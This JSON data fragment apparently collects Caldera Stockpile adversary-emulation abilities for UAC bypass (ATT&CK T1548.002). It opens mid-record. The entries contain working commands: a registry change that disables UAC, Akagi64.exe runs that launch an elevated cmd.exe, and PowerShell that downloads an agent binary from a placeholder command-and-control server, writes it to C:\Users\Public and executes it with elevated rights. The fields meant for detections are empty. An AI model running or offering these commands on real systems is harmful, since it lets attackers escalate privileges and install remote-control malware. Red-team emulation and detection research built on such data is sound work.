UAC bypass", "id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "name": "UAC bypass registry", "platforms": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}}}], "command_list": ["New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1548.002", "commands": [{"source": "data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml", "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "name": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe"}], "parsed_datasets": [{"Mitre Stockpile - Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe": {"id": "95ad5d69-563e-477b-802b-4855bfb3be09", "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe", "name": "wow64log DLL Hijack", "platforms": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}}}], "command_list": [".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1548.002", "commands": [{"source": "data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml", "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "name": "executes the slui exe file handler hijack"}], "parsed_datasets": [{"Mitre Stockpile - executes the slui exe file handler hijack": {"id": "b7344901-0b02-4ead-baf6-e3f629ed545f", "description": "executes the slui exe file handler hijack", "name": "Slui File Handler Hijack", "platforms": {"windows": {"psh": {"command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}}}], "command_list": [".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1548.002", "commands": [{"source": "data/abilities/privilege-escalation/e3db134c-4aed-4c5a-9607-c50183c9ef9e.yml", "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "name": "Bypass user account controls - medium"}], "parsed_datasets": [{"Mitre Stockpile - Bypass user account controls - medium": {"id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "name": "Bypass UAC Medium", "description": "Bypass user account controls - medium", "tactic": "privilege-escalation", "technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}, "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payloads": ["Bypass-UAC.ps1"]}}}}}], "command_list": ["$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;"], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}, {"technique_id": "T1548.002", "commands": [{"source": "data/abilities/privilege-escalation/e99cce5c-cb7e-4a6e-8a09-1609a221b90a.yml", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "name": "UIPI bypass with uiAccess application"}], "parsed_datasets": [{"Mitre Stockpile - UIPI bypass with uiAccess application": {"id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "description": "UIPI bypass with uiAccess application", "name": "duser/osksupport DLL Hijack", "platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payloads": ["Akagi64.exe"]}}}, "tactic": "privilege-escalation", "technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}}}], "command_list": ["$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\""], "attack_paths": [], "queries": [], "possible_detections": [], "external_reference": []}]}